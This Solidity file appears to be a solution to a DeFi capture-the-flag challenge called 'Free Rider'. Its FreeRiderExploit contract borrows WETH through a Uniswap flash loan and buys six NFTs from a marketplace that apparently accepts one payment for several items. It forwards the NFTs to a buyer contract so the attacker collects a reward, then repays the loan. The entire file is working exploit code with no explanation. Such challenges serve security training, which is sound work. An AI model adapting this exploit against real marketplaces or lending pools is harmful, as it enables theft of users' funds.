pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface IWETH {
    function withdraw(uint256) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderExploit {
    function exploit(IUniswapV2Pair pair, address mp, address buyer) external {
        bytes memory data = abi.encode(IWETH(address(pair.token0())), mp, buyer);

        // Call Uniswap pool for a flash loan of WETH
        pair.swap(15 ether, 0, address(this), data);
    }

    function uniswapV2Call(address, uint256 amount0Out, uint256, bytes memory data) external {
        (IWETH weth, address payable _mp, address payable _buyer) = abi.decode(
            data, (IWETH, address, address)
        );
        FreeRiderNFTMarketplace mp = FreeRiderNFTMarketplace(_mp);

        // Convert WETH to ETH
        weth.withdraw(amount0Out);

        // Buy NFTs
        uint256[] memory ids = new uint256[](6);
        for(uint i = 0; i < ids.length; i++) {
            ids[i] = i;
        }
        mp.buyMany{value: amount0Out}(ids);

        // Send NFTs to buyer contract
        // Once all NFTs are sent, buyer will transfer ETH reward to attacker
        for(uint i = 0; i < ids.length; i++) {
            mp.token().safeTransferFrom(address(this), _buyer, i);
        }

        // Calculate flash loan repay amount
        uint256 repayAmount = (amount0Out * 10035) / 10000;

        // Convert ETH to WETH
        weth.deposit{value: repayAmount}();

        // Repay flash loan
        weth.transfer(msg.sender, repayAmount);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    receive() external payable {}
}